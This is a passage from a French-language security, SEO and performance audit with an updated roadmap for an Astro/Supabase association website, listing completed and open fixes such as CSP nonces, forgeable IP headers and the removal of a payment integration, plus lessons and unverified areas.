      l'exposition réelle n'est pas lisible depuis le repo.
- [x] **26.** `git rm scripts/patch-*.cjs` (61 fichiers), `astro-error.log`, `logs/` — il reste 6 scripts
- [x] **27.** Écrire `AGENTS.md` + `ARCHITECTURE.md`
- [ ] **28.** *(partiel)* `lucide-astro` et `@astrojs/node` retirés ✅. **Restent** : deux lockfiles
      (`bun.lock` + `package-lock.json`) et un doublon de page légale —
      `legal/confidentialite.astro` (161 l.) **et** `legal/politique-de-confidentialite.astro`
      (324 l.), toutes deux prerendered, aucune ne redirigeant vers l'autre.
- [x] **29.** Check `Sec-Fetch-Site` dans le middleware
- [x] **30.** Optimiser le logo (SVG, < 5 Ko)

## PRIORITÉ 4 — Trimestre

- [ ] **31.** Découper `project/[id].astro` (1385 l.) en island React + composants — *en cours*.
      ⚠️ Un island React sur cette page serait **mort en prod** tant que `security.csp`
      n'est pas activé (cf. #41). Viser des composants `.astro` + modules ES, pas un island.
- [x] **32.** `/trombinoscope` → prerendu (plutôt qu'ISR) + fix `ReferenceError` (TDZ)
- [ ] **33.** Décision Tailwind : adopter ou retirer — ⛔ **décision produit, pas une tâche.**
      `tailwindcss` + `@tailwindcss/vite` installés, importés par `tailwind.css` et `dashboard.css`.
- [ ] **34.** Playwright sur les parcours critiques (connexion, inscription formation,
      validation manuelle du virement — le paiement en ligne a disparu avec #43)
- [x] **35.** `resource_downloads` : compteur agrégé asynchrone (CQRS-lite + `pg_cron`)
- [x] **36.** Guard TypeScript pour rendre `requireAuth()` impossible à ignorer
- [x] **37.** Rendre `llms-full.txt` statique
- [ ] **38.** Audit de contraste axe-core — nécessite un navigateur
- [ ] **39.** Rotation des clés Web3Forms + gitleaks pre-commit — nécessite de tourner une clé en prod
- [x] **40.** Externaliser le GTM ID
- [x] **41.** *(hors audit initial)* Nonce manquant sur les scripts inline SSR.
      La suppression de `injectNonce()` (#1) a rendu muets, en production et en silence :
      les 31 pages dashboard (`Toast`, `ConfirmDialog`), la page projet bénévole,
      le bandeau cookies, GTM et deux formulaires `formations`.
      Deux causes : (a) des scripts sans `nonce` explicite ; (b) **`define:vars` fait
      perdre l'attribut `nonce` à la compilation** — le source paraît correct,
      `astro check` passe, et l'attribut n'atteint jamais le HTML.
      Corrigé par des data-blocks `<script type="application/json">` + `jsonIsland()`.
      Verrouillé par deux assertions de build, testées en négatif.
      **Reste ouvert** : `dashboard/admin/appointments.astro` monte un island `client:load`
      dont Astro émet lui-même le bootstrap sans nonce → le calendrier admin ne s'hydrate
      pas en prod. Correctif = activer `security.csp` (cf. `astro.config.mjs`).
- [x] **42.** *(hors audit initial)* IP forgeable dans la preuve d'acceptation des CGV.
      L'item #3 n'avait corrigé que `lib/http.ts`. Deux routes lisaient encore
      `cf-connecting-ip` puis `x-forwarded-for` en direct — `api/legal/accept.ts:64`
      et `api/formations/inscrire.ts:114` — pour hacher l'IP insérée dans
      `legal_acceptance`. Ces en-têtes sont choisis par l'appelant : la trace
      juridique enregistrait l'adresse dictée par le client. Pas une élévation de
      privilège, mais une preuve à valeur probante nulle en cas de litige.
      Verrouillé par l'assertion « aucune lecture directe d'un header IP forgeable
      hors `lib/http.ts` », testée en négatif.
- [x] **43.** *(hors audit initial)* Retrait de l'intégration HelloAsso (commit `95ef69e`).
      Décision produit : un autre prestataire de paiement sera branché plus tard.
      −1319 lignes. Les inscriptions payantes passent par virement, validé
      manuellement. `payment_method = 'helloasso'` devient une valeur **legacy en
      lecture seule** : retirée de `paymentMethodSchema`, conservée en base — la
      réécrire falsifierait la comptabilité. La page de dons HelloAsso de
      l'association est conservée (lien externe, pas une intégration).
      ⚠️ La migration `20260709_drop_helloasso.sql` est **destructive et non
      appliquée** : elle supprime l'historique des paiements. L'article L123-22 du
      code de commerce impose 10 ans de conservation — son en-tête propose un
      archivage par renommage. **À trancher avant `supabase db push`.**
      Au passage : `helloasso_refunds` et la vue `training_revenue_by_month`
      n'étaient créées par **aucune migration versionnée** (la migration
      `20260624_email_queue_and_refunds.sql` citée par l'ancien `refund.ts` n'existe
      pas). Créées à la main en console, ou jamais — auquel cas `refund.ts` échouait
      en silence depuis toujours. À vérifier.

---

# 🚀 LES 20 AMÉLIORATIONS À PLUS FORT IMPACT

| # | Action | Impact principal | Effort | Gain mesurable |
|---|--------|------------------|--------|----------------|
| 1 | Supprimer `injectNonce()` | 🔒 Sécurité | 1 h | Le CSP redevient une défense |
| 2 | Échapper les 8 JSON-LD | 🔒 Sécurité | 2 h | Ferme une XSS stockée publique |
| 3 | `git rm public/robots.txt` | 🔍 SEO + 🤖 IA | 5 min | 30 disallows + policy LLM réactivés |
| 4 | `git rm public/sitemap.xml` | 🔍 SEO | 5 min | 7 → 24 URLs indexées, 0 404 |
| 5 | `inlineStylesheets: 'auto'` | ⚡ Perf | 5 min | −94 Ko / page, −94 Go/mois à 1 M PV |
| 6 | Self-host les fonts, retirer `@import` | ⚡ Perf + ⚖️ RGPD | 3 h | −4 requêtes tierces, −300 ms LCP |
| 7 | `x-vercel-forwarded-for` only | 🔒 Sécurité | 30 min | Ferme le bypass de brute-force |
| 8 | Rate-limit Upstash / WAF | 🔒 Sécurité | 4 h | Le rate-limit existe enfin |
| 9 | CookieConsent en vanilla | ⚡ Perf | 1 j | −185 Ko JS sur 129 pages |
| 10 | CSP dans `vercel.json` | 🔒 Sécurité | 2 h | Couvre le site public |
| 11 | **CI + assertions sur `dist/`** | 🛠️ DX + 🔒 | 4 h | **Empêche 1-10 de se reproduire** |
| 12 | Retirer le 2e `@import "tailwindcss"` | ⚡ Perf + 🎨 CSS | 15 min | −18 Ko inline / page |
| 13 | Réactiver le streaming (middleware) | ⚡ Perf | 2 h | TTFB divisé sur les routes SSR |
| 14 | `requireAdmin()` sur 40 routes | 🧱 Maintenabilité | 1 j | −240 lignes, −2 round-trips/req |
| 15 | `AGENTS.md` + `ARCHITECTURE.md` | 🤖 IA + 🛠️ DX | 3 h | Un agent cesse de croire les commentaires |
| 16 | Supprimer 61 `patch-*.cjs` | 🤖 IA + 🧱 | 10 min | −13 % du repo, `grep` exploitable |
| 17 | `zod` sur le webhook HelloAsso | 🔒 + 🧱 | 2 h | Sécurise le flux de paiement |
| 18 | Corriger l'ordre des titres | 🔍 SEO + ♿ A11y | 2 h | WCAG 1.3.1, structure lisible par les LLM |
| 19 | `supabase/migration` → `migrations` | 🧱 Maintenabilité | 1 h | La base devient reproductible |
| 20 | Référencer `llms.txt` (robots + `<link>`) | 🤖 IA | 15 min | Rend découvrable un fichier soigné mais invisible |

> **Les 10 premiers items représentent ~3 jours de travail** et font passer le score de 38 à ~58.
> **L'item #11 (CI) est le seul qui garantisse que le gain persiste.**

---

# Trois leçons transférables

1. **Une intention de sécurité non testée est une dette de sécurité.**
   `injectNonce()` a été écrit pour *renforcer* le CSP ; il l'a annulé. La revue de code ne l'aurait pas vu — seul un `curl -I` sur une preview l'aurait révélé.

2. **`public/` gagne toujours contre les intégrations.**
   Astro copie `public/` sans avertissement de collision. Toute intégration qui écrit dans `dist/` (robots, sitemap, RSS) doit être vérifiée sur l'artefact, jamais sur la config.

3. **La frontière prerender/SSR est une frontière de sécurité.**
   Tout ce que fait le middleware — CSP, rate-limit, session — n'existe pas sur les pages statiques. Sur ce projet, c'est **49 pages sur 91**, soit l'intégralité du trafic public.

---

# Angles morts de cet audit

## Fichiers absents (déclarés explicitement)

`ARCHITECTURE.md` · `CONTRIBUTING.md` · `AGENTS.md` · `CLAUDE.md` (racine) · `SECURITY.md` · `eslint.config.js` · `.github/` · `Dockerfile` · tout fichier de test · `supabase/migrations/` (le dossier existe au singulier) · toute configuration de monitoring.

## Ce que je n'ai pas pu vérifier sans exécution

| Sujet | Pourquoi | Action requise |
|---|---|---|
| **Contrastes de couleur** | Les tokens sont dans `theme.css` ; le calcul nécessite le rendu | Run axe-core / Lighthouse |
| **RLS effective** sur les 49 tables | Nécessite `\d+` sur la base réelle. Le code contourne massivement RLS via `service_role`, donc l'exposition dépend de policies non lisibles ici | Audit SQL sur la prod |
| ~~**Format de signature HelloAsso**~~ | ~~`helloasso.ts:278` utilise `clientSecret` comme clé HMAC.~~ | ✅ **Sans objet depuis le 2026-07-09** : l'intégration HelloAsso a été retirée (commit `95ef69e`). Les inscriptions payantes se règlent par virement, validé manuellement. Si un prestataire de paiement la remplace, la vérification HMAC constant-time redevient obligatoire — et la question de sa présence effective devra être tranchée **avant** la mise en production, pas après. |
| **Core Web Vitals réels** | Mes conclusions perf sont dérivées de mesures d'octets sur `dist/`, pas d'un Lighthouse en conditions réseau | Run Lighthouse mobile / 4G |

---

*Audit réalisé le 2026-07-08 sur le commit `da96ef7`. Toutes les assertions sont vérifiables par `grep` sur `src/` ou `dist/client/`.*

*Roadmap remise à jour le 2026-07-09 : état vérifié item par item dans le code, et non d'après les titres de commit. 35 faits / 43. Les items 41 (nonce SSR), 42 (IP forgeable) et 43 (retrait HelloAsso) ne figuraient pas dans l'audit initial.*
